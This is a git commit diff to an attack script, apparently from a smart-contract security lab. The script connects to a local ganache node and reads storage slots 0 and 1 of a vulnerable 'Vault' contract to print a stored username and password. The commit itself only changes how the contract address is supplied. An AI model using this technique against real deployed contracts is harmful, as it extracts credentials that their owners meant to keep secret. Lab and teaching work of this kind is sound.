23b946bd148799a8f9545d4156f41e3452f75cbe
pyraven <rav3nsecure@gmail.com>
2022-06-25 20:14:19 -0500

    Removing vuln-contract-address arg requirement, renaming

--- contracts/Vault/attack.py
+++ contracts/Vault/attack.py
@@ -7,14 +7,13 @@ def main():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('--host', type=str, required=True)
-    parser.add_argument('--vuln-contract-addresss', type=str, required=True)
     args = parser.parse_args()
 
     ganache_client = Web3(Web3.HTTPProvider(f"http://{args.host}"))
 
-    contract_instance = ganache_client.eth.contract(address=args.vuln_contract_addresss, abi=vuln['Contract ABI'])
-    username_hex = contract_instance.web3.eth.getStorageAt(args.vuln_contract_addresss, 0)
-    password_hex = contract_instance.web3.eth.getStorageAt(args.vuln_contract_addresss, 1)
+    contract_instance = ganache_client.eth.contract(address=vuln['Contract Address'], abi=vuln['Contract ABI'])
+    username_hex = contract_instance.web3.eth.getStorageAt(vuln['Contract Address'], 0)
+    password_hex = contract_instance.web3.eth.getStorageAt(vuln['Contract Address'], 1)
     print(Web3.toText(username_hex).replace('\x00','').replace('\n', ''))
     print(Web3.toText(password_hex).replace('\x00','').replace('\n', ''))
 
